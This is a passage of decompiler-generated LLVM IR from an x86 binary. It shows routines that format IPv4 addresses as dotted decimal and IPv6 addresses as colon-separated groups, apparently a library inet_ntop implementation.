  %v6_80516df = zext i8 %div5 to i32
  %tmp21 = urem i8 %v2_80516d8, 100
  %v12_80516df = zext i8 %tmp21 to i32
  %v14_80516df = mul nuw nsw i32 %v12_80516df, 256
  %v15_80516df = or i32 %v6_80516df, %v5_80516d8
  %v16_80516df = or i32 %v15_80516df, %v14_80516df
  store i32 %v16_80516df, i32* %eax.global-to-local, align 4
  %v2_80516e3 = or i8 %div5, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_80516e6 = load i32, i32* @esp, align 4
  %v4_80516e6 = add i32 %v2_80516e6, 43
  %v5_80516e6 = add i32 %v4_80516e6, %v3_80516e6
  %v6_80516e6 = inttoptr i32 %v5_80516e6 to i8*
  store i8 %v2_80516e3, i8* %v6_80516e6, align 1
  %v0_80516ea = load i32, i32* %edi.global-to-local, align 4
  %v1_80516ea = add i32 %v0_80516ea, 1
  store i32 %v0_80516ea, i32* @ecx, align 4
  %v0_80516f3 = load i32, i32* @esp, align 4
  %v2_80516f3 = add i32 %v0_80516ea, 43
  %v3_80516f3 = add i32 %v2_80516f3, %v0_80516f3
  %v4_80516f3 = inttoptr i32 %v3_80516f3 to i8*
  %v5_80516f3 = load i8, i8* %v4_80516f3, align 1
  %v11_80516f3 = icmp eq i8 %v5_80516f3, 48
  store i1 %v11_80516f3, i1* %zf.global-to-local, align 1
  %v1_80516f8 = icmp eq i1 %v11_80516f3, false
  %v0_8051722 = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_80516f8, label %dec_label_pc_8051720, label %dec_label_pc_80516fa

dec_label_pc_80516fa:                             ; preds = %dec_label_pc_80516d0
  %v3_80516fe = trunc i32 %v0_8051722 to i16
  %v5_80516fe = udiv i16 %v3_80516fe, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_80516fe, 256
  %tmp33 = urem i16 %tmp, 10
  %tmp22 = zext i16 %tmp33 to i32
  store i32 %tmp22, i32* %edx.global-to-local, align 4
  %v1_8051710 = trunc i16 %tmp33 to i8
  %v2_8051710 = or i8 %v1_8051710, 48
  %v12_8051710 = zext i8 %v2_8051710 to i32
  store i32 %v12_8051710, i32* %eax.global-to-local, align 4
  %v7_8051712 = icmp eq i8 %v1_8051710, 0
  store i1 %v7_8051712, i1* %zf.global-to-local, align 1
  store i8 %v2_8051710, i8* %v4_80516f3, align 1
  %v0_8051718 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8051718, label %dec_label_pc_8051743, label %dec_label_pc_805171a

dec_label_pc_805171a:                             ; preds = %dec_label_pc_80516fa
  store i32 %v1_80516ea, i32* @ecx, align 4
  br label %dec_label_pc_8051743

dec_label_pc_8051720:                             ; preds = %dec_label_pc_80516d0
  store i32 %v1_80516ea, i32* %ebx.global-to-local, align 4
  %v3_8051728 = trunc i32 %v0_8051722 to i16
  %v5_8051728 = udiv i16 %v3_8051728, 10
  %tmp34 = urem i16 %v5_8051728, 256
  %tmp35 = urem i16 %tmp34, 10
  %tmp23 = zext i16 %tmp35 to i32
  store i32 %tmp23, i32* %edx.global-to-local, align 4
  %v1_8051738 = add i32 %v0_80516ea, 2
  store i32 %v1_8051738, i32* @ecx, align 4
  %v1_805173d = trunc i16 %tmp35 to i8
  %v2_805173d = or i8 %v1_805173d, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_805173d = zext i8 %v2_805173d to i32
  store i32 %v12_805173d, i32* %eax.global-to-local, align 4
  %v4_805173f = add i32 %v0_80516ea, 44
  %v5_805173f = add i32 %v4_805173f, %v0_80516f3
  %v6_805173f = inttoptr i32 %v5_805173f to i8*
  store i8 %v2_805173d, i8* %v6_805173f, align 1
  br label %dec_label_pc_8051743

dec_label_pc_8051743:                             ; preds = %dec_label_pc_80516fa, %dec_label_pc_805171a, %dec_label_pc_8051720
  %v0_8051743 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051743 = inttoptr i32 %v0_8051743 to i8*
  %v2_8051743 = load i8, i8* %v1_8051743, align 1
  %v3_8051743 = zext i8 %v2_8051743 to i32
  store i32 %v3_8051743, i32* %eax.global-to-local, align 4
  %v0_805174c = load i32, i32* @esi, align 4
  %v1_805174c = add i32 %v0_805174c, 1
  store i32 %v1_805174c, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051751 = load i32, i32* @esp, align 4
  %v1_8051751 = load i32, i32* @ecx, align 4
  %v2_8051751 = add i32 %v0_8051751, 44
  %v3_8051751 = add i32 %v2_8051751, %v1_8051751
  %v4_8051751 = inttoptr i32 %v3_8051751 to i8*
  store i8 46, i8* %v4_8051751, align 1
  %v0_8051756 = load i32, i32* @ecx, align 4
  %v1_8051756 = add i32 %v0_8051756, 2
  store i32 %v1_8051756, i32* %edi.global-to-local, align 4
  %v0_8051759 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051759 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051759 = zext i32 %v1_8051759 to i64
  %v3_8051759 = load i32, i32* %edx.global-to-local, align 4
  %v4_8051759 = zext i32 %v3_8051759 to i64
  %v5_8051759 = mul nuw i64 %v4_8051759, 4294967296
  %v6_8051759 = or i64 %v5_8051759, %v2_8051759
  %v7_8051759 = zext i32 %v0_8051759 to i64
  %v8_8051759 = udiv i64 %v6_8051759, %v7_8051759
  %v9_8051759 = trunc i64 %v8_8051759 to i32
  %v10_8051759 = urem i64 %v6_8051759, %v7_8051759
  %v11_8051759 = trunc i64 %v10_8051759 to i32
  store i32 %v11_8051759, i32* @edx, align 4
  %v3_805175b = and i32 %v9_8051759, -256
  %v1_805175d = trunc i64 %v10_8051759 to i8
  %v2_805175d = add i8 %v1_805175d, 48
  %v12_805175d = zext i8 %v2_805175d to i32
  %v15_805175d = or i32 %v12_805175d, %v3_805175b
  store i32 %v15_805175d, i32* %eax.global-to-local, align 4
  %v2_805175f = load i32, i32* @esp, align 4
  %v4_805175f = add i32 %v0_8051756, 43
  %v5_805175f = add i32 %v4_805175f, %v2_805175f
  %v6_805175f = inttoptr i32 %v5_805175f to i8*
  store i8 %v2_805175d, i8* %v6_805175f, align 1
  %v0_8051763 = load i32, i32* @esi, align 4
  %v10_8051763 = icmp eq i32 %v0_8051763, 3
  store i1 %v10_8051763, i1* %zf.global-to-local, align 1
  %v7_8051766 = icmp sgt i32 %v0_8051763, 3
  %v1_805176c.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_8051766, label %dec_label_pc_805176c, label %dec_label_pc_80516d0

dec_label_pc_805176c:                             ; preds = %dec_label_pc_8051743, %dec_label_pc_805169c
  %v1_805176c = phi i32 [ 0, %dec_label_pc_805169c ], [ %v1_805176c.pre, %dec_label_pc_8051743 ]
  %v0_805176c = load i32, i32* @esp, align 4
  %v2_805176c = add i32 %v0_805176c, 42
  %v3_805176c = add i32 %v2_805176c, %v1_805176c
  %v4_805176c = inttoptr i32 %v3_805176c to i8*
  store i8 0, i8* %v4_805176c, align 1
  %v0_8051771 = load i32, i32* @esp, align 4
  %v9_8051771 = icmp eq i32 %v0_8051771, 12
  store i1 %v9_8051771, i1* %zf.global-to-local, align 1
  %v2_8051774 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8051774, i32* @edi, align 4
  store i32 %v2_8051774, i32* %stack_var_-92, align 4
  %v1_8051779 = bitcast i32* %stack_var_-33 to i8*
  %v2_8051779 = call i32 @function_804d204(i8* %v1_8051779)
  store i32 %v2_8051779, i32* @eax, align 4
  %v15_8051781 = icmp eq i32 %v2_8051779, %v0_80516b8
  store i1 %v15_8051781, i1* %zf.global-to-local, align 1
  %tmp36 = icmp ugt i32 %v2_8051779, %v0_80516b8
  br i1 %tmp36, label %dec_label_pc_8051787, label %dec_label_pc_8051796

dec_label_pc_8051787:                             ; preds = %dec_label_pc_805176c
  %v0_8051787 = load i32, i32* %stack_var_-92, align 4
  %v1_8051787 = call i32 @function_804b7f4(i32 %v0_8051787)
  %v1_805178c = inttoptr i32 %v1_8051787 to i32*
  store i32 28, i32* %v1_805178c, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80517a5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80517a5

dec_label_pc_8051796:                             ; preds = %dec_label_pc_805176c
  store i32 %v0_80516b4, i32* %stack_var_-92, align 4
  %v2_805179d = inttoptr i32 %v0_80516b4 to i8*
  %v3_805179d = call i32 @function_804d1e8(i8* %v2_805179d, i32 %v2_8051774)
  store i32 %v3_805179d, i32* %eax.global-to-local, align 4
  %v0_80517a2 = load i32, i32* @esp, align 4
  %v6_80517a2 = icmp eq i32 %v0_80517a2, -16
  store i1 %v6_80517a2, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80517a5

dec_label_pc_80517a5:                             ; preds = %dec_label_pc_8051787, %dec_label_pc_8051796
  %v0_80517ac = phi i32 [ 0, %dec_label_pc_8051787 ], [ %v3_805179d, %dec_label_pc_8051796 ]
  %v0_80517a5 = phi i32 [ %v0_80517a5.pre, %dec_label_pc_8051787 ], [ %v15_80516a2, %dec_label_pc_8051796 ]
  %v9_80517a5 = icmp eq i32 %v0_80517a5, -60
  store i1 %v9_80517a5, i1* %zf.global-to-local, align 1
  store i32 %v0_805169e, i32* @esi, align 4
  store i32 %v0_805169d, i32* @edi, align 4
  ret i32 %v0_80517ac

; uselistorder directives
  uselistorder i32 %v0_8051763, { 2, 0, 1 }
  uselistorder i8 %v2_805173d, { 1, 0 }
  uselistorder i32 %v0_8051722, { 1, 0 }
  uselistorder i1 %v11_80516f3, { 1, 0 }
  uselistorder i32 %v1_80516ea, { 1, 0 }
  uselistorder i32 %v5_80516d8, { 1, 0 }
  uselistorder i32 %v0_805176324, { 1, 2, 0 }
  uselistorder i32 %v0_80516b4, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i32* %stack_var_-92, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 18, 19, 20, 9, 11, 12, 8, 10, 3, 13, 7, 14, 15, 16, 17, 21, 31, 32, 4, 26, 22, 5, 23, 24, 25, 27, 28, 6, 29, 30, 2 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 2, 3, 4, 0, 1 }
  uselistorder i8 48, { 9, 5, 6, 0, 7, 10, 11, 1, 8, 2, 3, 4 }
  uselistorder i32 -65536, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80517a5, { 1, 0 }
  uselistorder label %dec_label_pc_8051743, { 2, 1, 0 }
}

define i32 @function_80517ad(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80517ad:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_80517ae = load i32, i32* @edi, align 4
  %v0_80517af = load i32, i32* @esi, align 4
  %v0_80517b0 = load i32, i32* @ebx, align 4
  %v15_80517b1 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_80517b8 = icmp eq i32 %arg1, 2
  br i1 %v9_80517b8, label %dec_label_pc_80517c8, label %dec_label_pc_80517bd

dec_label_pc_80517bd:                             ; preds = %dec_label_pc_80517ad
  %v9_80517bd = icmp eq i32 %arg1, 10
  %v1_80517c0 = icmp eq i1 %v9_80517bd, false
  br i1 %v1_80517c0, label %dec_label_pc_8051967, label %dec_label_pc_80517e0

dec_label_pc_80517c8:                             ; preds = %dec_label_pc_80517ad
  store i32 %arg3, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_80517d4 = call i32 @function_805169c(i32 %v0_80517b0, i32 %v0_80517af, i32 %v0_80517ae)
  store i32 %v3_80517d4, i32* %eax.global-to-local, align 4
  store i32 %v3_80517d4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051974

dec_label_pc_80517e0:                             ; preds = %dec_label_pc_80517bd
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_80517e5 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_80517e5, i32* %eax.global-to-local, align 4
  store i32 %v2_80517e5, i32* %stack_var_-124, align 4
  %v4_80517ea = bitcast i32* %stack_var_-48 to i8*
  %v5_80517ea = call i32 @function_804d1d0(i8* %v4_80517ea, i32 0, i32 32)
  store i32 %v5_80517ea, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_805180c = add i32 %arg2, 1
  br label %dec_label_pc_80517f6

dec_label_pc_80517f6:                             ; preds = %dec_label_pc_80517f6.dec_label_pc_80517f6_crit_edge, %dec_label_pc_80517e0
  %v1_8051819 = phi i32 [ %v15_80517b1, %dec_label_pc_80517e0 ], [ %v1_8051819.pre, %dec_label_pc_80517f6.dec_label_pc_80517f6_crit_edge ]
  %v0_805181162 = phi i32 [ 0, %dec_label_pc_80517e0 ], [ %v0_805181d.pre, %dec_label_pc_80517f6.dec_label_pc_80517f6_crit_edge ]
  %v1_80517ff = ashr i32 %v0_805181162, 31
  %v2_8051800 = zext i32 %v0_805181162 to i64
  %v4_8051800 = zext i32 %v1_80517ff to i64
  %v5_8051800 = mul nuw i64 %v4_8051800, 4294967296
  %v6_8051800 = or i64 %v5_8051800, %v2_8051800
  %v8_8051800 = sdiv i64 %v6_8051800, 2
  %v9_8051800 = trunc i64 %v8_8051800 to i32
  store i32 %v9_8051800, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8051800, i32* %ebx.global-to-local, align 4
  %v2_8051808 = add i32 %v0_805181162, %arg2
  %v3_8051808 = inttoptr i32 %v2_8051808 to i8*
  %v4_8051808 = load i8, i8* %v3_8051808, align 1
  %v5_8051808 = zext i8 %v4_8051808 to i32
  store i32 %v5_8051808, i32* %eax.global-to-local, align 4
  %v3_805180c = add i32 %v2_805180c, %v0_805181162
  %v4_805180c = inttoptr i32 %v3_805180c to i8*
  %v5_805180c = load i8, i8* %v4_805180c, align 1
  %v6_805180c = zext i8 %v5_805180c to i32
  store i32 %v6_805180c, i32* %edx.global-to-local, align 4
  %v1_8051811 = add i32 %v0_805181162, 2
  store i32 %v1_8051811, i32* %ecx.global-to-local, align 4
  %v2_8051814 = mul nuw nsw i32 %v5_8051808, 256
  %v2_8051817 = or i32 %v6_805180c, %v2_8051814
  store i32 %v2_8051817, i32* %eax.global-to-local, align 4
  %v3_8051819 = mul i32 %v9_8051800, 4
  %v4_8051819 = add i32 %v3_8051819, 60
  %v5_8051819 = add i32 %v4_8051819, %v1_8051819
  %v6_8051819 = inttoptr i32 %v5_8051819 to i32*
  store i32 %v2_8051817, i32* %v6_8051819, align 4
  %v0_805181d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8051820 = icmp sgt i32 %v0_805181d.pre, 15
  br i1 %v7_8051820, label %dec_label_pc_8051822, label %dec_label_pc_80517f6.dec_label_pc_80517f6_crit_edge

dec_label_pc_80517f6.dec_label_pc_80517f6_crit_edge: ; preds = %dec_label_pc_80517f6
  %v1_8051819.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80517f6

dec_label_pc_8051822:                             ; preds = %dec_label_pc_80517f6
  %v4_80517e0 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805182c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805182c

dec_label_pc_805182c:                             ; preds = %dec_label_pc_8051822, %dec_label_pc_8051859
  %v0_805185961 = phi i32 [ 0, %dec_label_pc_8051822 ], [ %v1_8051859, %dec_label_pc_8051859 ]
  %v0_805184460 = phi i32 [ -1, %dec_label_pc_8051822 ], [ %v0_80518447, %dec_label_pc_8051859 ]
  %v0_805186459 = phi i32 [ -1, %dec_label_pc_8051822 ], [ %v0_80518498, %dec_label_pc_8051859 ]
  %v0_805186f58 = phi i32 [ -1, %dec_label_pc_8051822 ], [ %v0_805185412, %dec_label_pc_8051859 ]
  %v2_805182c = mul nuw nsw i32 %v0_805185961, 4
  %v3_805182c = add nuw nsw i32 %v2_805182c, 60
  %v4_805182c = add i32 %v3_805182c, %v0_805182c.pre
  %v5_805182c = inttoptr i32 %v4_805182c to i32*
  %v6_805182c = load i32, i32* %v5_805182c, align 4
  %v7_805182c = icmp eq i32 %v6_805182c, 0
  %v1_8051831 = icmp eq i1 %v7_805182c, false
  %v10_8051844 = icmp eq i32 %v0_805184460, -1
  br i1 %v1_8051831, label %dec_label_pc_8051844, label %dec_label_pc_8051833

dec_label_pc_8051833:                             ; preds = %dec_label_pc_805182c
  %v1_8051836 = icmp eq i1 %v10_8051844, false
  br i1 %v1_8051836, label %dec_label_pc_8051841, label %dec_label_pc_8051838

dec_label_pc_8051838:                             ; preds = %dec_label_pc_8051833
  store i32 %v0_805185961, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051859

dec_label_pc_8051841:                             ; preds = %dec_label_pc_8051833
  %v0_8051841 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051841 = add i32 %v0_8051841, 1
  store i32 %v1_8051841, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051859

dec_label_pc_8051844:                             ; preds = %dec_label_pc_805182c
  br i1 %v10_8051844, label %dec_label_pc_8051859, label %dec_label_pc_8051849

dec_label_pc_8051849:                             ; preds = %dec_label_pc_8051844
  %v10_8051849 = icmp eq i32 %v0_805186459, -1
  %v0_8051852.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805184e = load i32, i32* @ebp, align 4
  %v7_8051850 = icmp sgt i32 %v0_8051852.pre, %v1_805184e
  %or.cond = or i1 %v10_8051849, %v7_8051850
  br i1 %or.cond, label %dec_label_pc_8051852, label %dec_label_pc_8051856

dec_label_pc_8051852:                             ; preds = %dec_label_pc_8051849
  store i32 %v0_8051852.pre, i32* @ebp, align 4
  store i32 %v0_805186f58, i32* @edi, align 4
  br label %dec_label_pc_8051856

dec_label_pc_8051856:                             ; preds = %dec_label_pc_8051849, %dec_label_pc_8051852
  %v0_805184910 = phi i32 [ %v0_805186f58, %dec_label_pc_8051852 ], [ %v0_805186459, %dec_label_pc_8051849 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051859

dec_label_pc_8051859:                             ; preds = %dec_label_pc_8051844, %dec_label_pc_8051841, %dec_label_pc_8051838, %dec_label_pc_8051856
  %v0_805185412 = phi i32 [ %v0_805186f58, %dec_label_pc_8051844 ], [ %v0_805186f58, %dec_label_pc_8051841 ], [ %v0_805185961, %dec_label_pc_8051838 ], [ -1, %dec_label_pc_8051856 ]
  %v0_80518447 = phi i32 [ -1, %dec_label_pc_8051844 ], [ %v0_805184460, %dec_label_pc_8051841 ], [ %v0_805185961, %dec_label_pc_8051838 ], [ -1, %dec_label_pc_8051856 ]
  %v0_80518498 = phi i32 [ %v0_805186459, %dec_label_pc_8051844 ], [ %v0_805186459, %dec_label_pc_8051841 ], [ %v0_805186459, %dec_label_pc_8051838 ], [ %v0_805184910, %dec_label_pc_8051856 ]
  %v1_8051859 = add nuw nsw i32 %v0_805185961, 1
  store i32 %v1_8051859, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8051859, 8
  br i1 %exitcond, label %dec_label_pc_805185f, label %dec_label_pc_805182c

dec_label_pc_805185f:                             ; preds = %dec_label_pc_8051859
  %v10_805185f = icmp eq i32 %v0_805185412, -1
  br i1 %v10_805185f, label %dec_label_pc_8051871, label %dec_label_pc_8051864

dec_label_pc_8051864:                             ; preds = %dec_label_pc_805185f
  %v10_8051864 = icmp eq i32 %v0_80518498, -1
  %v0_805186d.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8051864, label %dec_label_pc_805186d, label %dec_label_pc_8051869

dec_label_pc_8051869:                             ; preds = %dec_label_pc_8051864
  %v1_8051869 = load i32, i32* @ebp, align 4
  %v7_805186b = icmp sgt i32 %v0_805186d.pre, %v1_8051869
  br i1 %v7_805186b, label %dec_label_pc_805186d, label %dec_label_pc_8051871

dec_label_pc_805186d:                             ; preds = %dec_label_pc_8051864, %dec_label_pc_8051869
  store i32 %v0_805186d.pre, i32* @ebp, align 4
  store i32 %v0_805185412, i32* @edi, align 4
  br label %dec_label_pc_8051871

dec_label_pc_8051871:                             ; preds = %dec_label_pc_8051869, %dec_label_pc_805185f, %dec_label_pc_805186d
  %v5_805187e = phi i32 [ %v0_80518498, %dec_label_pc_8051869 ], [ %v0_80518498, %dec_label_pc_805185f ], [ %v0_805185412, %dec_label_pc_805186d ]
  %v10_8051871 = icmp eq i32 %v5_805187e, -1
  br i1 %v10_8051871, label %dec_label_pc_8051881, label %dec_label_pc_8051876

dec_label_pc_8051876:                             ; preds = %dec_label_pc_8051871
  %v0_8051876 = load i32, i32* @ebp, align 4
  %v1_8051876 = add i32 %v0_8051876, -1
  %v6_8051876 = sub i32 0, %v0_8051876
  %v7_8051876 = and i32 %v0_8051876, %v6_8051876
  %v8_8051876 = icmp slt i32 %v7_8051876, 0
  %v9_8051876 = icmp eq i32 %v1_8051876, 0
  %v10_8051876 = icmp slt i32 %v1_8051876, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_805187e = icmp ne i1 %v10_8051876, %v8_8051876
  %v4_805187e = or i1 %v9_8051876, %v3_805187e
  %v7_805187e = select i1 %v4_805187e, i32 -1, i32 %v5_805187e
  store i32 %v7_805187e, i32* @edi, align 4
  br label %dec_label_pc_8051881

dec_label_pc_8051881:                             ; preds = %dec_label_pc_8051871, %dec_label_pc_8051876
  %v0_805192117 = phi i32 [ %v5_805187e, %dec_label_pc_8051871 ], [ %v7_805187e, %dec_label_pc_8051876 ]
  %v2_8051881 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8051881, i32* @ebx, align 4
  %v3_8051903 = add i32 %v4_80517e0, 64
  %v12_80518c1 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805192150 = icmp eq i32 %v0_805192117, -1
  %v1_80518c9 = icmp eq i1 %v12_80518c1, false
  br label %dec_label_pc_805188c

dec_label_pc_805188c:                             ; preds = %dec_label_pc_8051881, %dec_label_pc_8051917
  %v10_805192157 = phi i1 [ %v10_805192150, %dec_label_pc_8051881 ], [ %v10_8051921, %dec_label_pc_8051917 ]
  %v0_80518a656 = phi i32 [ 0, %dec_label_pc_8051881 ], [ %v1_8051917, %dec_label_pc_8051917 ]
  %v1_805189c55 = phi i32 [ %v0_805192117, %dec_label_pc_8051881 ], [ %v0_8051921.pre, %dec_label_pc_8051917 ]
  %v0_80518aa54 = phi i32 [ %v2_8051881, %dec_label_pc_8051881 ], [ %v0_80518a018, %dec_label_pc_8051917 ]
  %stack_var_-120.153 = phi i8* [ null, %dec_label_pc_8051881 ], [ %stack_var_-120.0, %dec_label_pc_8051917 ]
  %stack_var_-116.152 = phi i32 [ 32, %dec_label_pc_8051881 ], [ %stack_var_-116.0, %dec_label_pc_8051917 ]
  br i1 %v10_805192157, label %dec_label_pc_80518a6, label %dec_label_pc_8051891

dec_label_pc_8051891:                             ; preds = %dec_label_pc_805188c
  %v2_8051891 = sub i32 %v0_80518a656, %v1_805189c55
  %v8_8051891 = xor i32 %v0_80518a656, %v1_805189c55
  %v9_8051891 = xor i32 %v2_8051891, %v0_80518a656
  %v10_8051891 = and i32 %v9_8051891, %v8_8051891
  %v11_8051891 = icmp slt i32 %v10_8051891, 0
  %v12_8051891 = icmp eq i32 %v2_8051891, 0
  %v13_8051891 = icmp slt i32 %v2_8051891, 0
  %v2_8051893 = icmp eq i1 %v13_8051891, %v11_8051891
  br i1 %v2_8051893, label %dec_label_pc_8051895, label %dec_label_pc_80518a6

dec_label_pc_8051895:                             ; preds = %dec_label_pc_8051891
  %v1_8051895 = load i32, i32* @ebp, align 4
  %v2_8051895 = add i32 %v1_8051895, %v1_805189c55
  store i32 %v2_8051895, i32* %eax.global-to-local, align 4
  %v2_8051898 = sub i32 %v0_80518a656, %v2_8051895
  %v8_8051898 = xor i32 %v2_8051895, %v0_80518a656
  %v9_8051898 = xor i32 %v2_8051898, %v0_80518a656
  %v10_8051898 = and i32 %v9_8051898, %v8_8051898
  %v11_8051898 = icmp slt i32 %v10_8051898, 0
  %v13_8051898 = icmp slt i32 %v2_8051898, 0
  %v2_805189a = icmp eq i1 %v13_8051898, %v11_8051898
  br i1 %v2_805189a, label %dec_label_pc_80518a6, label %dec_label_pc_805189c

dec_label_pc_805189c:                             ; preds = %dec_label_pc_8051895
  %v1_805189e = icmp eq i1 %v12_8051891, false
  br i1 %v1_805189e, label %dec_label_pc_8051917, label %dec_label_pc_80518a0

dec_label_pc_80518a0:                             ; preds = %dec_label_pc_805189c
  %v1_80518a0 = inttoptr i32 %v0_80518aa54 to i8*
  store i8 58, i8* %v1_80518a0, align 1
  %v0_80518a3 = load i32, i32* @ebx, align 4
  %v1_80518a3 = add i32 %v0_80518a3, 1
  store i32 %v1_80518a3, i32* @ebx, align 4
  br label %dec_label_pc_8051917

dec_label_pc_80518a6:                             ; preds = %dec_label_pc_8051891, %dec_label_pc_8051895, %dec_label_pc_805188c
  %v1_80518a6 = icmp eq i32 %v0_80518a656, 0
  br i1 %v1_80518a6, label %dec_label_pc_80518ae, label %dec_label_pc_80518aa

dec_label_pc_80518aa:                             ; preds = %dec_label_pc_80518a6
  %v1_80518aa = inttoptr i32 %v0_80518aa54 to i8*
  store i8 58, i8* %v1_80518aa, align 1
  %v0_80518ad = load i32, i32* @ebx, align 4
  %v1_80518ad = add i32 %v0_80518ad, 1
  store i32 %v1_80518ad, i32* @ebx, align 4
  %v0_80518ae.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80518ae

dec_label_pc_80518ae:                             ; preds = %dec_label_pc_80518a6, %dec_label_pc_80518aa
  %v0_805190c = phi i32 [ %v0_80518aa54, %dec_label_pc_80518a6 ], [ %v1_80518ad, %dec_label_pc_80518aa ]
  %v1_8051903 = phi i32 [ 0, %dec_label_pc_80518a6 ], [ %v0_80518ae.pre, %dec_label_pc_80518aa ]
  %v9_80518ae = icmp eq i32 %v1_8051903, 6
  %v1_80518b1 = icmp eq i1 %v9_80518ae, false
  br i1 %v1_80518b1, label %dec_label_pc_8051902, label %dec_label_pc_80518b3

dec_label_pc_80518b3:                             ; preds = %dec_label_pc_80518ae
  %v0_80518b3 = load i32, i32* @edi, align 4
  %v1_80518b3 = icmp eq i32 %v0_80518b3, 0
  %v1_80518b5 = icmp eq i1 %v1_80518b3, false
  br i1 %v1_80518b5, label %dec_label_pc_8051902, label %dec_label_pc_80518b7

dec_label_pc_80518b7:                             ; preds = %dec_label_pc_80518b3
  %v0_80518b7 = load i32, i32* @ebp, align 4
  %v9_80518b7 = icmp eq i32 %v0_80518b7, 6
  br i1 %v9_80518b7, label %dec_label_pc_80518cb, label %dec_label_pc_80518bc

dec_label_pc_80518bc:                             ; preds = %dec_label_pc_80518b7
  %v9_80518bc = icmp eq i32 %v0_80518b7, 5
  %v1_80518bf = icmp eq i1 %v9_80518bc, false
  br i1 %v1_80518bf, label %dec_label_pc_8051902, label %dec_label_pc_80518c1

dec_label_pc_80518c1:                             ; preds = %dec_label_pc_80518bc
  br i1 %v1_80518c9, label %dec_label_pc_8051902, label %dec_label_pc_80518cb

dec_label_pc_80518cb:                             ; preds = %dec_label_pc_80518c1, %dec_label_pc_80518b7
  %v2_80518d1 = sub i32 %v0_805190c, %v2_8051881
  store i32 %v2_80518d1, i32* @esi, align 4
  %v2_80518dc = sub i32 46, %v2_80518d1
  store i32 %v2_80518dc, i32* @ecx, align 4
  store i32 %v0_805190c, i32* @edx, align 4
  %v1_80518e0 = add i32 %arg2, 12
  store i32 %v1_80518e0, i32* @eax, align 4
  %v0_80518e3 = load i32, i32* %stack_var_-124, align 4
  %v2_80518e3 = ptrtoint i8* %stack_var_-120.153 to i32
  %v4_80518e3 = call i32 @function_805169c(i32 %v0_80518e3, i32 %v2_80518e3, i32 %stack_var_-116.152)
  store i32 %v4_80518e3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80518ea = icmp eq i32 %v4_80518e3, 0
  br i1 %v1_80518ea, label %dec_label_pc_8051974, label %dec_label_pc_80518f2

dec_label_pc_80518f2:                             ; preds = %dec_label_pc_80518cb
  %v0_80518f5 = load i32, i32* @ebx, align 4
  store i32 %v0_80518f5, i32* %stack_var_-124, align 4
  %v1_80518f6 = inttoptr i32 %v0_80518f5 to i8*
  %v2_80518f6 = call i32 @function_804d204(i8* %v1_80518f6)
  store i32 %v2_80518f6, i32* %eax.global-to-local, align 4
  %v0_80518fe = load i32, i32* @ebx, align 4
  %v3_80518fe = add i32 %v0_80518fe, %v2_80518f6
  store i32 %v3_80518fe, i32* @ebx, align 4
  %v0_8051926.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051926

